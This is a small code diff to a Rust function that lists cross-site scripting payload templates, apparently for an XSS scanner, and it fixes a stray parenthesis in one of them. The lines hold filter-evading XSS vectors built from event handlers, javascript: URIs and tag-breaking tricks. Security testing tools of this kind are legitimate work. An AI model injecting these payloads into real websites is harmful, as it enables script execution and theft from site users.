@@ -36,7 +36,7 @@ pub fn get_dynamic_xss_html_payloads() -> Vec<String> {
         "<IMG src=x onerror={JS} ClAss={CLASS}>",
         "<sVg onload={JS} claSS={CLASS}>",
         "<sCrIpt/cLaSs={CLASS}>{JS}</scRipT>",
-        "<xmp><p title=\"</xmp><svg/onload={JS}) class={CLASS}>",
+        "<xmp><p title=\"</xmp><svg/onload={JS} class={CLASS}>",
         "<details open ontoggle={JS} class={CLASS}>",
         "<iFrAme/src=JaVAsCrIPt:{JS} ClAss={CLASS}>",
         "</<a/href='><svg/onload={JS} claSS={CLASS}>'>",
